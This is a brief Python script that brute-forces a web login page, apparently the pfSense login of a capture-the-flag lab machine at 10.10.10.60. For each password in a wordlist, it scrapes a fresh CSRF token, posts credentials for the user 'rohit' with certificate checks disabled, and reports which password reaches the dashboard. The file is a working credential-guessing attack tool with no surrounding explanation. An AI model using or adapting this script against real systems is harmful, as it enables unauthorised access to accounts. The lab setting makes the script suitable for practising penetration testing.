import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re

# regular expression to pull csrf token off page matching on this example: 
# csrfMagicToken = "sid:66fe26bdb3d3f3c98f0c6c08d4339c8299d7f45b,1625326588"
re_csrf = 'csrfMagicToken = "(.*?)"' # this takes everything between the () of the MagicToken var

# create a session
s = requests.session()
# disable warning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

password_list = open('passwords.txt')
for password in password_list:
    # POST to get the token
    response = s.post('https://10.10.10.60/index.php', verify=False) 
    # find the finrst match of the reg expression 
    csrf = re.findall(re_csrf, response.text)[0]
    #create cookie
    login = {'__csrf_magic': csrf, 'usernamefld': 'rohit', 'passwordfld': password[:-1], 'login': 'Login' }
    # POST login request
    login_response = s.post('https://10.10.10.60/index.php', data=login)
    # a valid login will take the user to the dashboard
    if "Dashboard" in login_response.text:
        print(f'valid login {password}')
    else: 
        print('failed login')
        s.cookies.clear()
